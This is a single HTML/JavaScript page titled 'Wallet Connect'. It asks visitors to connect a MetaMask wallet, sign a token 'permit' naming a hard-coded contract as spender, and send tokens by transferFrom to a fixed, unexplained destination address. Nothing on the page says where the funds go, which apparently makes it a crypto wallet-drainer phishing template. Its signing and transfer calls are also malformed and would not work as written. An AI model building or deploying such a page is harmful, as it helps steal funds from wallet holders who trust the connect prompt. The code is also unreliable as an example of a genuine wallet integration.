<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <h1>Connect Your Wallet</h1>
    <button id="connectWalletButton">Connect Wallet</button>
    <button id="signPermitButton" disabled>Sign Permit</button>
    <button id="transferTokensButton" disabled>Transfer Tokens</button>

    <script>
        const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3';
        const abi = [
            {
                "inputs": [{"internalType": "address","name": "account","type": "address"}],
                "name": "balanceOf",
                "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address","name": "owner","type": "address"},
                    {"internalType": "address","name": "spender","type": "address"},
                    {"internalType": "uint256","name": "value","type": "uint256"},
                    {"internalType": "uint256","name": "deadline","type": "uint256"},
                    {"internalType": "uint8","name": "v","type": "uint8"},
                    {"internalType": "bytes32","name": "r","type": "bytes32"},
                    {"internalType": "bytes32","name": "s","type": "bytes32"}
                ],
                "name": "permit",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address","name": "sender","type": "address"},
                    {"internalType": "address","name": "recipient","type": "address"},
                    {"internalType": "uint256","name": "amount","type": "uint256"}
                ],
                "name": "transferFrom",
                "outputs": [{"internalType": "bool","name": "","type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let web3;
        let contract;
        let selectedAccount;

        // Connect Wallet
        document.getElementById('connectWalletButton').addEventListener('click', async () => {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    web3 = new Web3(window.ethereum);
                    const accounts = await web3.eth.getAccounts();
                    selectedAccount = accounts[0];
                    contract = new web3.eth.Contract(abi, contractAddress);
                    alert(`Connected to wallet: ${selectedAccount}`);
                    document.getElementById('signPermitButton').disabled = false;
                    document.getElementById('transferTokensButton').disabled = false;
                } catch (error) {
                    console.error('Connection failed:', error);
                    alert('Connection failed. Please try again.');
                }
            } else {
                alert('Please install MetaMask to use this feature.');
            }
        });

        // Sign Permit
        document.getElementById('signPermitButton').addEventListener('click', async () => {
            const spender = contractAddress;  // The contract address is the spender
            const value = web3.utils.toWei('1', 'ether'); // Permit value
            const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now

            const permitData = await web3.eth.signTypedData(
                [{
                    type: 'address',
                    name: 'owner',
                    value: selectedAccount
                }, {
                    type: 'address',
                    name: 'spender',
                    value: spender
                }, {
                    type: 'uint256',
                    name: 'value',
                    value: value
                }, {
                    type: 'uint256',
                    name: 'deadline',
                    value: deadline
                }]
            );

            alert(`Permit signed successfully: ${permitData}`);
        });

        // Transfer Tokens
        document.getElementById('transferTokensButton').addEventListener('click', async () => {
            const recipient = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';  // The destination address
            const amount = web3.utils.toWei('1', 'ether');

            try {
                await contract.methods.transferFrom(selectedAccount, recipient, amount).send({ from: selectedAccount });
                alert('Tokens transferred successfully!');
            } catch (error) {
                console.error('Transfer failed:', error);
                alert('Transfer failed. Please try again.');
            }
        });
    </script>
</body>
</html>
